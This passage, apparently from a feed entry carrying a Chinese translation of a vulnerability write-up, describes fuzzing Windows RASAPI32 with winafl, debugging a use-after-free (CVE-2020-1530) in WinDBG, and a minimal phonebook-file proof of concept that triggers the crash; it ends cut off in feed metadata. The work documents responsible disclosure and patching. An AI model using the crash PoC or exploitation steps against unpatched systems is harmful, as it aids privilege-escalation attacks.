;returned&#160;with&#160;the&#160;required&#160;buffer&#160;size&#160;and\n&#160;&#160;&#160;&#160;//&#160;a&#160;return&#160;code&#160;of&#160;ERROR_BUFFER_TOO_SMALL\n&#160;&#160;&#160;&#160;dwRet&#160;=&#160;RasEnumEntriesA(NULL,&#160;lpszPhonebook,&#160;lpRasEntryName,&#160;&#38;dwCb,&#160;&#38;dwEntries);\n&#160;\n&#160;&#160;&#160;&#160;if&#160;(dwRet&#160;==&#160;ERROR_BUFFER_TOO_SMALL)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//&#160;Allocate&#160;the&#160;memory&#160;needed&#160;for&#160;the&#160;array&#160;of&#160;RAS&#160;entry&#160;names.\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lpRasEntryName&#160;=&#160;(LPRASENTRYNAME)HeapAlloc(GetProcessHeap(),&#160;HEAP_ZERO_MEMORY,&#160;dwCb);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;(lpRasEntryName&#160;==&#160;NULL)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wprintf(L&#34;HeapAlloc&#160;failed!\\n&#34;);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;0;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//&#160;The&#160;first&#160;RASENTRYNAME&#160;structure&#160;in&#160;the&#160;array&#160;must&#160;contain&#160;the&#160;structure&#160;size\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lpRasEntryName[0].dwSize&#160;=&#160;sizeof(RASENTRYNAME);\n&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//&#160;Call&#160;RasEnumEntries&#160;to&#160;enumerate&#160;all&#160;RAS&#160;entry&#160;names\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dwRet&#160;=&#160;RasEnumEntries(NULL,&#160;lpszPhonebook,&#160;lpRasEntryName,&#160;&#38;dwCb,&#160;&#38;dwEntries);\n&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//&#160;If&#160;successful,&#160;print&#160;the&#160;RAS&#160;entry&#160;names\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;(ERROR_SUCCESS&#160;==&#160;dwRet)&#160;{\n&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;printf(&#34;Number&#160;of&#160;Entries&#160;%d\\n&#34;,&#160;dwEntries);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wprintf(L&#34;The&#160;following&#160;RAS&#160;entry&#160;names&#160;were&#160;found:\\n&#34;);\n&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;for&#160;(DWORD&#160;i&#160;=&#160;0;&#160;i&#160;&#60;&#160;dwEntries;&#160;i++)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;printf(&#34;%s\\n&#34;,&#160;lpRasEntryName[i].szEntryName);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//Deallocate&#160;memory&#160;for&#160;the&#160;connection&#160;buffer\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HeapFree(GetProcessHeap(),&#160;0,&#160;lpRasEntryName);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lpRasEntryName&#160;=&#160;NULL;\n&#160;&#160;&#160;&#160;}\n&#160;\n&#160;\n&#160;&#160;&#160;&#160;return&#160;0;\n}</pre><p>编译上述代码，并使用示例文件运行代码：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730050842222.png\" title=\"1597730050842222.png\" alt=\"6.png\"/></p><p>很好，我们已经可以使用这样的原始工具去测量代码覆盖率（请参考下一章），但这样的效果并不是很好。因此，下一步是尝试在RASAPI32 API中添加1-2个函数，以增加代码覆盖范围，并增大发现Bug的概率。经过大量的实验和出错，以及反复查阅GitHub Repos，最终得到的工具如下：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730058794973.png\" title=\"1597730058794973.png\" alt=\"7.png\"/></p><p>在这里，我添加了RasValidateEntryName和RasGetEntryProperties函数。使用另一个文件样本运行最终版本的工具，得到的截图如下：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730064479790.png\" title=\"1597730064479790.png\" alt=\"8.png\"/></p><p><span style=\"font-size: 20px;\"><strong>0x04 探索代码覆盖率</strong></span></p><p>在准备好工具，并使用示例进行尝试之后，我快速编写了这个Python代码片段，用于自动化通过drcov获取DynamoRIO文件的过程：</p><pre class=\"brush:html;toolbar:false\">import&#160;subprocess\nimport&#160;glob\n&#160;\nsamples&#160;=&#160;glob.glob(&#34;C:\\\\Users\\\\simos\\\\Desktop\\\\pbk_samples\\\\*&#34;)\n&#160;\nfor&#160;sample&#160;in&#160;samples:\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;harness&#160;=&#160;&#34;C:\\\\pbk_fuzz\\\\RasEntries.exe&#160;%s&#160;test&#34;&#160;%&#160;sample\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;command&#160;=&#160;&#34;C:\\\\DRIO79\\\\bin32\\\\drrun.exe&#160;-t&#160;drcov&#160;--&#160;%s&#34;&#160;%&#160;harness\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;[*]&nbsp;Running&#160;harness&#160;%s&#160;with&#160;sample&#160;%s&#34;&#160;%&#160;(harness,&#160;command)&#160;&#160;&#160;&#160;\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;p&#160;=&#160;subprocess.Popen(command,&#160;stdout=subprocess.PIPE,&#160;stderr=subprocess.PIPE)\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;out,&#160;err&#160;=&#160;p.communicate()\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;out\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;err</pre><p>运行上面的简单脚本后，得到以下输出：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730117269698.png\" title=\"1597730117269698.png\" alt=\"9.png\"/></p><p>注意DynamoRIO产生的drcov *.log文件。我仅仅是在BinaryNinja中加载了RASAPI32.dll，并使用了lightouse插件。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730125174723.png\" title=\"1597730125174723.png\" alt=\"10.png\"/></p><p>根据上面的截图，可以看出覆盖率还不到10%。理想情况下，我们预期文件样本至少能使用20%的模块。尽管如此，我还是决定继续尝试，看看是否能得到不错的结果。</p><p><span style=\"font-size: 20px;\"><strong>0x05 模糊测试</strong></span></p><p>有了最终工具和上面的示例，同时已经测量了一些基本的代码覆盖率，现在是时候进行模糊测试了。在模糊测试的过程中，我使用了两种不同的技术，一种是winafl，另一种是我编写的简单模糊测试框架，该框架只是对radamsa和winappdbg进行包装，用于监视和保存崩溃。以前，我确实使用winafl取得了一些成功，但是在涉及到基于文本的格式分析这样的目标时，winafl并不是非常有效。</p><p>在这次测试过程中，我使用了更新到最新版本的Windows 7 x64虚拟机（在迁移到Windows 10之前，我从Microsoft Dev获得），我经常遇到DynamoRIO无法从其它Windows DLL获得合适覆盖的问题，即使使用最新的DynamoRIO重新编译winafl也是如此。通常情况，我都会使用一个技巧，并且百试百灵——</p><p>禁用ASLR！</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730163190455.png\" title=\"1597730163190455.png\" alt=\"11.png\"/></p><p>ASLR会随机化偏移量，并且通常会让事情变得更加复杂。因此，当我进行模糊测试时，我发现先禁用它会变得更加容易，并且我们会得到指向main()或my_target()的静态地址。</p><p>接下来，使用先前获得的地址迅速运行winafl：</p><pre class=\"brush:html;toolbar:false\">afl-fuzz.exe&#160;-i&#160;Y:\\samples&#160;-o&#160;Y:\\pbk_fuzz&#160;-D&#160;Y:\\DRIO7\\bin32\\&#160;-t&#160;20000&#160;--&#160;-target_module&#160;RasEntries.exe&#160;-coverage_module&#160;RASAPI32.dll&#160;-target_offset&#160;0x01090&#160;-fuzz_iterations&#160;2000&#160;-nargs&#160;2&#160;--&#160;Y:\\RasEntries.exe&#160;@@</pre><p>接下来，winafl就会为我们完成所有的工作。这里，我只是使用winafl对我的工具（RasEntries.exe）进行了检测，并使用RASAPI32.dll DLL进行了覆盖。经过三天的模糊测试，得到以下结果：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730175188690.png\" title=\"1597730175188690.png\" alt=\"12.png\"/></p><p>在大量崩溃中，有25个是属于唯一的。值得一提的是，在仅仅进行了半个小时的模糊测试后，我就几乎成功得到了第一次崩溃。下面是一些值得关注的发现：</p><p>1、由于模糊过程中会持续不断地遇到相同的错误，因此我在它还在寻找新路径的过程中就将模糊工具停止了。</p><p>2、最开始的速度相当不错（每秒超过100次执行），但随着我们不断发现更多的路径，其速度也开始下降。</p><p>3、稳定性 &#60; 90%，推测也许是消耗的内存没有进行正确清理？</p><p>在这个阶段，我还要提到，如果运行类似于radamsa这样的简单模糊工具，我们实际上可能会在几秒钟内就发生崩溃：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730183574110.png\" title=\"1597730183574110.png\" alt=\"13.png\"/></p><p><span style=\"font-size: 20px;\"><strong>0x06 崩溃的分类</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730193116050.png\" title=\"1597730193116050.png\" alt=\"14.png\"/></p><p>从上图中可以看出，崩溃的大小几乎相同，这表明我们可能一次又一次地遇到相同的错误。在使用BugId让这个过程自动化之后，我们最终发现，25个“唯一的”漏洞实际上是相同的情况！</p><p><span style=\"font-size: 20px;\"><strong>0x07 漏洞分析</strong></span></p><p>在准备好工具后，我们发现可以产生崩溃。接下来，我们在调试器下运行：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730202424730.png\" title=\"1597730202424730.png\" alt=\"15.png\"/></p><p>在启用页面堆和栈跟踪（gflags.exe /i binary +hpa +ust）的情况下，注意我们是如何再次触发崩溃的。崩溃发生在wcsstr函数中：</p><p>返回指向str中首次出现的strSearch的指针，如果strSearch没有出现在str中，则返回NULL。如果strSearch指向长度为0的字符串，则该函数返回str。</p><p>同时，也会被RASAPI32的ReadEntryList函数调用。我们正在尝试解引用edx指向的值，根据页面验证，该值无效。实际上，尝试获取有关edx寄存器中存储的内存地址的更多信息，我们可以证实它先前已经被释放。显然，这是一种释放后使用（Use-After-Free）的状况，因为某种程度上已经释放了该内存，但wcsstr函数仍然尝试访问这一部分的内存。现在，让我们找出问题的真正所在。</p><p>在这个步骤，我不得不切换使用新旧版本的WinDBG，因为新版本在检查可用内存时不是非常可靠。首先，我们检查释放的分配：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730211610544.png\" title=\"1597730211610544.png\" alt=\"16.png\"/></p><p>根据上图，在0x7214936c处，RASAPI32!CopyToPbport+0x00000064负责释放内存。在进行Unassemble（ub）后，其结构如下：</p><pre class=\"brush:html;toolbar:false\">72149361&#160;7409&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;je&#160;&#160;&#160;&#160;&#160;&#160;RASAPI32!CopyToPbport+0x64&#160;(7214936c)\n72149363&#160;ff770c&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[edi+0Ch]\n72149366&#160;ff159ca01672&#160;&#160;&#160;&#160;call&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[RASAPI32!_imp__GlobalFree&#160;(7216a09c)]</pre><p>让我们重新启动WinDBG，并设置一个断点：</p><pre class=\"brush:html;toolbar:false\">0:000&#62;&#160;?72149366&#160;-&#160;RASAPI32\nEvaluate&#160;expression:&#160;693094&#160;=&#160;000a9366\n0:000&#62;&#160;bp&#160;RASAPI32+000a9366</pre><p>我们计算RASAPI32基本模块的偏移量，由于ASLR会重新确定其偏移量，因此我们无法获得其确切值。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730228113723.png\" title=\"1597730228113723.png\" alt=\"17.png\"/></p><p>正如预期的那样，到达了内存断点。在释放该内存之前，通过反汇编我们看到，KERNELBASE!GlobalFree函数仅获得了一个参数：</p><pre class=\"brush:html;toolbar:false\">push&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[edi+0Ch]</pre><p>要再次确认，我们可以参阅MSDN文档：</p><pre class=\"brush:html;toolbar:false\">&#160;&#160;&#160;&#160;HGLOBAL&#160;GlobalFree(&#160;_Frees_ptr_opt_&#160;HGLOBAL&#160;hMem&#160;);</pre><p>其中还有一些值得关注的位，分配的缓冲区的值为0x2a。这非常关键，因为我们需要知道这个值是否能由用户控制。那么它是多少个字节呢？</p><pre class=\"brush:html;toolbar:false\">0:000&#62;&#160;?2a\nEvaluate&#160;expression:&#160;42&#160;=&#160;0000002a</pre><p>由此看来，初始分配的缓冲区为42个字节。接下来，我们需要知道哪些函数被调用。</p><pre class=\"brush:html;toolbar:false\">0:000&#62;&#160;ub&#160;721355f8\nRASAPI32!StrDupWFromAInternal+0x1a:\n721355dd&#160;50&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;eax\n721355de&#160;53&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;ebx\n721355df&#160;ff15bca11672&#160;&#160;&#160;&#160;call&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[RASAPI32!_imp__MultiByteToWideChar&#160;(7216a1bc)]\n721355e5&#160;8945fc&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mov&#160;&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[ebp-4],eax\n721355e8&#160;8d044502000000&#160;&#160;lea&#160;&#160;&#160;&#160;&#160;eax,[eax*2+2]\n721355ef&#160;50&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;eax\n721355f0&#160;6a40&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;40h\n721355f2&#160;ff15a4a01672&#160;&#160;&#160;&#160;call&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[RASAPI32!_imp__GlobalAlloc&#160;(7216a0a4)]</pre><p>经过一些基本的逆向工程之后，我们可以看到在RASAPI32的StrDupWFromAInternal函数中，首先调用了MultiByteToWideChar，然后根据字符串的长度，使用以下两个参数来调用GlobalAlloc：</p><pre class=\"brush:html;toolbar:false\">DECLSPEC_ALLOCATOR&#160;HGLOBAL&#160;GlobalAlloc(\n&#160;&#160;UINT&#160;&#160;&#160;uFlags,\n&#160;&#160;SIZE_T&#160;dwBytes\n);</pre><p>第一个是静态值0x40，通过查询文档，发现它对应uFlags。</p><pre class=\"brush:html;toolbar:false\">GMEM_ZEROINIT\n&#160;\n0x0040\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;Initializes&#160;memory&#160;contents&#160;to&#160;zero</pre><p>第二个参数是先前计算的字符串长度：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730288191130.png\" title=\"1597730288191130.png\" alt=\"18.png\"/></p><p>查看分配前的状态：</p><pre class=\"brush:html;toolbar:false\">0:000&#62;&#160;dc&#160;edi\n0019f07c&#160;&#160;314e5056&#160;0000302d&#160;00000000&#160;00000000&#160;&#160;VPN1-0..........\n0019f08c&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f09c&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f0ac&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f0bc&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f0cc&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f0dc&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0019f0ec&#160;&#160;00000000&#160;00000000&#160;00000000&#160;00000000&#160;&#160;................\n0:000&#62;&#160;p\neax=00000007&#160;ebx=0000fde9&#160;ecx=c8a47ecb&#160;edx=00000007&#160;esi=00000000&#160;edi=0019f07c\neip=721355e8&#160;esp=0019f048&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246\nRASAPI32!StrDupWFromAInternal+0x25:\n721355e8&#160;8d044502000000&#160;&#160;lea&#160;&#160;&#160;&#160;&#160;eax,[eax*2+2]\n0:000&#62;\neax=00000010&#160;ebx=0000fde9&#160;ecx=c8a47ecb&#160;edx=00000007&#160;esi=00000000&#160;edi=0019f07c\neip=721355ef&#160;esp=0019f048&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246\nRASAPI32!StrDupWFromAInternal+0x2c:\n721355ef&#160;50&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;eax\n0:000&#62;\neax=00000010&#160;ebx=0000fde9&#160;ecx=c8a47ecb&#160;edx=00000007&#160;esi=00000000&#160;edi=0019f07c\neip=721355f0&#160;esp=0019f044&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246\nRASAPI32!StrDupWFromAInternal+0x2d:\n721355f0&#160;6a40&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;push&#160;&#160;&#160;&#160;40h\n0:000&#62;\neax=00000010&#160;ebx=0000fde9&#160;ecx=c8a47ecb&#160;edx=00000007&#160;esi=00000000&#160;edi=0019f07c\neip=721355f2&#160;esp=0019f040&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246\nRASAPI32!StrDupWFromAInternal+0x2f:\n721355f2&#160;ff15a4a01672&#160;&#160;&#160;&#160;call&#160;&#160;&#160;&#160;dword&#160;ptr&#160;[RASAPI32!_imp__GlobalAlloc&#160;(7216a0a4)]&nbsp;ds:002b:7216a0a4={KERNELBASE!GlobalAlloc&#160;(76a2f000)}\n0:000&#62;&#160;dds&#160;esp&#160;L2\n0019f040&#160;&#160;00000040&#160;&#160;&#160;&#60;==&#160;uFlags\n0019f044&#160;&#160;00000010&#160;&#160;&#160;&#60;==&#160;dwBytes</pre><p>因此，可以看出，“VPN1-0”通讯簿条目的长度是6 + 1，由用户控制，将其乘以2再加上2后，就作为了GlobalAlloc方法的参数。既然如此，那么我们绝对可以控制它。</p><p>但是，是什么导致了释放呢？花了一些时间后，我发现问题出现在通讯簿的这个条目上：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730308429161.png\" title=\"1597730308429161.png\" alt=\"19.png\"/></p><p>因此，格式错误的条目会导致StrDupWFromAInternal释放内存。</p><p><span style=\"font-size: 20px;\"><strong>0x08 漏洞利用</strong></span></p><p>现在，我们对于这个漏洞已经有了基本的了解，接下来就开始尝试利用。我们先从最小化PoC开始：</p><pre class=\"brush:html;toolbar:false\">[CRASH]\nEncoding=1\nPBVersion=4\nType=2\n&#160;\nMEDIA=rastapiPort=VPN1\nDevice=AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD\n&#160;\nDEVICE=vpn\nPhoneNumber=localhost\nAreaCode=\nCountryCode=0\nCountryID=0\nUseDialingRules=0\nComment=\nFriendlyName=\nLastSelectedPhone=0\nPromoteAlternates=0\nTryNextAlternateOnFail=1</pre><p>根据之前的分析，我们希望看到eax具有设备输入 “AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD”+1 = 33 (0x21) 字节的长度：</p><p><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730328888874.png\" title=\"1597730328888874.png\" alt=\"20.png\"/></p><p>我们的假设是正确的！那么，实际分配呢？</p><pre class=\"brush:html;toolbar:false\">eax=00000021&#160;ebx=0000fde9&#160;ecx=1184fd4b&#160;edx=00000021&#160;esi=00000000&#160;edi=0019f07c\neip=721355e8&#160;esp=0019f048&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246\nRASAPI32!StrDupWFromAInternal+0x25:\n721355e8&#160;8d044502000000&#160;&#160;lea&#160;&#160;&#160;&#160;&#160;eax,[eax*2+2]\n0:000&#62;&#160;p\neax=00000044&#160;ebx=0000fde9&#160;ecx=1184fd4b&#160;edx=00000021&#160;esi=00000000&#160;edi=0019f07c\neip=721355ef&#160;esp=0019f048&#160;ebp=0019f058&#160;iopl=0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nv&#160;up&#160;ei&#160;pl&#160;zr&#160;na&#160;pe&#160;nc\ncs=0023&#160;&#160;ss=002b&#160;&#160;ds=002b&#160;&#160;es=002b&#160;&#160;fs=0053&#160;&#160;gs=002b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;efl=00000246</pre><p>如前所述，最终得到的值是eax * 2 + 2，即0x44字节。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730347385423.png\" title=\"1597730347385423.png\" alt=\"21.png\"/></p><p>注意，在监视分配/释放后，我们可以看到内存分配器将初始值近似为0x48，然后又进行了三个分配，最终地址被重新使用。</p><p>最终，我们需要找到一种方法，用相同大小的东西来替换掉释放的对象。</p><p><span style=\"font-size: 20px;\"><strong>0x09 总结</strong></span></p><p>尽管我们已经获得了一个可以利用的原语，能够实现释放后使用（UAF），但遗憾的是，在现实中还缺少脚本环境，让漏洞利用变得相对困难。我认为，并没有简单的方法可以操纵对象或分配器。希望大家可以进行深入研究，找到实现这一目标的方式。</p><p><span style=\"font-size: 20px;\"><strong>0x10 时间节点</strong></span></p><p>2020年4月27日 初次报告给Microsoft。</p><p>2020年8月11日 Microsoft分配了该漏洞的编号CVE-2020-1530。</p><p>2020年8月11日 Microsoft将该漏洞确认为特权提升漏洞，CVSS评分为7.8。</p><p>2020年8月11日 Microsoft发布修复补丁。</p><p><span style=\"font-size: 20px;\"><strong>0x11 参考资料</strong></span></p><p>[1] RasEnumEntries文档：<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/ras/nf-ras-rasenumentriesa\">https://docs.microsoft.com/en-us/windows/win32/api/ras/nf-ras-rasenumentriesa</a><br/></p><p>[2] 请求拨号连接文档中的示例通讯簿文件：<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/65a59781-dfc5-4e9c-a422-3738d1fc3252\">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/65a59781-dfc5-4e9c-a422-3738d1fc3252</a></p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 04:52:30 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729942246461.png","linkMd5":"175108e0d2314a7edc11456f658ec56a","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn24@2020_5/2020/08/25/10-01-58-158_b0abe49a702b4bf6.webp","destWidth":1647,"destHeight":725,"sourceBytes":133616,"destBytes":83838,"author":"41yf1sh","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729942246461.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn24@2020_5/2020/08/25/10-01-58-158_b0abe49a702b4bf6.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729955440323.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn88@2020_4/2020/08/25/10-02-04-786_a18ed8eaf2c96a0e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729973446777.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn95@2020_4/2020/08/25/10-02-05-267_f3ff403ea8c42594.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730012408042.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn72@2020_4/2020/08/25/10-02-03-040_c10f3f9ed3fe18ae.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730023837775.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn32@2020_3/2020/08/25/10-02-04-927_a85a09481494ddbc.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730050842222.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn24@2020_1/2020/08/25/10-02-03-996_cd4e7c19b62603f2.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730058794973.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn71@2020_4/2020/08/25/10-02-02-419_887c4237904953c9.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730064479790.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn27@2020_2/2020/08/25/10-02-04-377_efcd714fdb2f53c5.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730117269698.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn36@2020_3/2020/08/25/10-02-02-647_ff2eba2a5f65489e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730125174723.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn59@2020_3/2020/08/25/10-02-02-594_1fe528c596f2c590.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730163190455.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn43@2020_4/2020/08/25/10-02-03-622_e03175ff078195d9.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730175188690.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn15@2020_2/2020/08/25/10-02-04-911_70b18585f96f2fb0.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730183574110.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn20@2020_5/2020/08/25/10-02-03-795_6885fc1b2741e197.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730193116050.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn7@2020_3/2020/08/25/10-02-04-033_aab6a4d246a974b8.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730202424730.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn68@2020_3/2020/08/25/10-02-03-580_68e0da731761da29.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730211610544.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn40@2020_2/2020/08/25/10-02-02-998_d4f936f3d7ac2ebc.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730228113723.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn56@2020_4/2020/08/25/10-02-03-849_9fa5c4e13ef0775b.webp","https://img.4